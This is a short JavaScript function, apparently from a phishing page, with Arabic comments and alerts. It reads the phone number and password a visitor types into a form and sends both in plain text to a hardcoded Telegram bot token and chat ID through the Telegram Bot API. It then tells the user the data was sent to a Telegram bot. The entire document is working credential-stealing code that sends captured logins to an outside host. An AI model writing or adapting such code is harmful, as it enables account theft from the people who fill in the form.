function submitToTelegram() {
    var phoneValue = document.getElementById('phone').value;
    var passwordValue = document.getElementById('password').value;

    if (phoneValue && passwordValue) {
        var telegramBotToken = '6692627244:AAFHCmEn5zgzEv2pn1rQXfFJZOzGueQV8kQ';
        var telegramChatId = '6964432572';
        var url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=Phone: ${phoneValue}%0APassword: ${passwordValue}`;

        // إرسال البيانات إلى بوت تلجرام
        fetch(url)
        .then(response => response.json())
        .then(data => {
            alert('تم إرسال البيانات بنجاح إلى بوت تلجرام.');
        })
        .catch(error => {
            console.error('Error:', error);
            alert('حدث خطأ أثناء إرسال البيانات إلى بوت تلجرام.');
        });
    } else {
        alert('الرجاء إدخال رقم الهاتف وكلمة المرور.');
    }
}